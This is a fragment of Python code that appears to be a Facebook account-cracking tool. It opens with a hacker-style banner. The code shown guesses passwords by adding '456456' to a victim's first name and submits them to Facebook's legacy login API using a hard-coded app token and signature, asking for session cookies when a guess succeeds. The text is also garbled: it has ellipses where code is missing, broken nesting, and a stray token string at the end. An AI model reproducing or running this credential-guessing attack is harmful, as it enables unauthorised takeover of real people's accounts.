...
logo = """
   Muneeb Abbas
   ▄︻̷̿┻̿═━一
   THE ANONYMOUS mastermz76 TRICKER 
   THE LEGEND ℒℴνℯ
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'z-m-portal.fb.com' in q["error_msg"]:
															...
															a = requests.get('http://z-m-portal.fb.com/mobile/pixel.gif/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '456456'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q: X-ZERO-EH:2,c411ecf44b759a11b5edb0c5fa4a08a1,AWGvn5LKAOpWmXE3YI_Qdb5RP7Co4FjdoNwX2ZWJq2mj8m8BNXIEhMVLnuN-iUE2aic
